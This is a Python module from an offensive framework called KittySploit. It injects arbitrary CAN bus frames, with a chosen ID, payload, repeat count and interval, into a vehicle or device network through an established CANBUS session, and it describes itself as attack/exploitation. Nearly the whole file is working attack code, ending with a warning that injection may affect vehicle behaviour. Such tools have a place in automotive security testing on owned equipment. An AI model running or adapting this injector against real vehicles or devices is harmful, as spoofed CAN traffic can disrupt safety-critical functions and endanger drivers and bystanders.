#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CANBUS Message Injector - Injects CAN messages into the bus
Author: KittySploit Team
Version: 1.0.0
"""

from kittysploit import *
from core.output_handler import print_info, print_success, print_error, print_warning
import time

class Module(Post):
    """Inject CAN messages into the bus"""
    
    __info__ = {
        "name": "Inject CAN Message",
        "description": "Injects CAN messages into the bus (attack/exploitation)",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.CANBUS,
    }
    
    can_id = OptString("", "CAN ID to inject (hex format, e.g., 0x123)", required=True)
    data = OptString("", "Data to inject (hex format, e.g., DEADBEEF)", required=True)
    extended_id = OptBool(False, "Use extended CAN ID (29-bit)", required=True)
    remote_frame = OptBool(False, "Send as remote frame", required=True)
    count = OptInteger(1, "Number of times to inject the message", required=True)
    interval = OptFloat(0.1, "Interval between injections in seconds", required=True)
    
    def check(self):
        """Check if session is a CANBUS session and if python-can is available"""
        try:
            import can
        except ImportError:
            print_error("python-can is required but not installed")
            print_info("Install it with: pip install python-can")
            return False
        
        session_id_value = self.session_id.value if hasattr(self.session_id, 'value') else str(self.session_id)
        if not session_id_value:
            print_error("Session ID not set")
            return False
        
        if self.framework and hasattr(self.framework, 'session_manager'):
            session = self.framework.session_manager.get_session(session_id_value)
            if session:
                if session.session_type == 'canbus':
                    return True
                else:
                    print_error(f"Session is not a CANBUS session (type: {session.session_type})")
                    return False
            else:
                print_error("Session not found")
                return False
        else:
            print_warning("Session manager not available - assuming valid session")
            return True
    
    def run(self):
        """Inject CAN message into the bus"""
        try:
            import can
            
            session_id_value = self.session_id.value if hasattr(self.session_id, 'value') else str(self.session_id)
            
            if not self.framework or not hasattr(self.framework, 'session_manager'):
                print_error("Framework or session manager not available")
                return False
            
            session = self.framework.session_manager.get_session(session_id_value)
            if not session:
                print_error("Session not found")
                return False
            
            # Get CAN bus configuration from session
            interface = session.data.get('interface') if session.data else 'socketcan'
            channel = session.data.get('channel') if session.data else 'can0'
            bitrate = session.data.get('bitrate') if session.data else 500000
            
            # Parse CAN ID
            can_id_str = str(self.can_id.value) if hasattr(self.can_id, 'value') else str(self.can_id)
            if can_id_str.startswith('0x') or can_id_str.startswith('0X'):
                can_id = int(can_id_str, 16)
            else:
                can_id = int(can_id_str, 16) if all(c in '0123456789ABCDEFabcdef' for c in can_id_str) else int(can_id_str)
            
            # Parse data
            data_str = str(self.data.value) if hasattr(self.data, 'value') else str(self.data)
            data_str = data_str.replace(' ', '').replace(':', '')
            if len(data_str) % 2 != 0:
                print_error("Data must be in hex format with even number of characters")
                return False
            
            data_bytes = bytes.fromhex(data_str)
            
            # Create CAN message
            message = can.Message(
                arbitration_id=can_id,
                data=data_bytes,
                is_extended_id=self.extended_id.value if hasattr(self.extended_id, 'value') else self.extended_id,
                is_remote_frame=self.remote_frame.value if hasattr(self.remote_frame, 'value') else self.remote_frame
            )
            
            print_info("Injecting CAN message...")
            print_info("=" * 80)
            print_info(f"CAN ID: 0x{can_id:03X} ({'extended' if message.is_extended_id else 'standard'})")
            print_info(f"Data: {data_str.upper()}")
            print_info(f"Remote Frame: {message.is_remote_frame}")
            print_info(f"Count: {self.count.value if hasattr(self.count, 'value') else self.count}")
            print_info(f"Interval: {self.interval.value if hasattr(self.interval, 'value') else self.interval} seconds")
            print_info("")
            
            # Connect to CAN bus
            try:
                if interface == "socketcan":
                    bus = can.interface.Bus(channel=channel, bustype='socketcan')
                elif interface == "virtual":
                    bus = can.interface.Bus(channel=channel, bustype='virtual')
                else:
                    bus = can.interface.Bus(channel=channel, bustype=interface, bitrate=bitrate)
            except Exception as e:
                print_error(f"Failed to connect to CAN bus: {e}")
                return False
            
            # Inject messages
            count = int(self.count.value) if hasattr(self.count, 'value') else int(self.count)
            interval = float(self.interval.value) if hasattr(self.interval, 'value') else float(self.interval)
            
            injected = 0
            for i in range(count):
                try:
                    bus.send(message)
                    injected += 1
                    print_success(f"Message {i+1}/{count} injected: 0x{can_id:03X} - {data_str.upper()}")
                    
                    if i < count - 1:  # Don't sleep after last message
                        time.sleep(interval)
                except Exception as e:
                    print_error(f"Error injecting message {i+1}: {e}")
            
            bus.shutdown()
            
            print_success(f"\nSuccessfully injected {injected}/{count} messages")
            print_warning("⚠️  Message injection may affect vehicle/device behavior!")
            
            return True
            
        except Exception as e:
            print_error(f"Error injecting CAN message: {e}")
            import traceback
            traceback.print_exc()
            return False

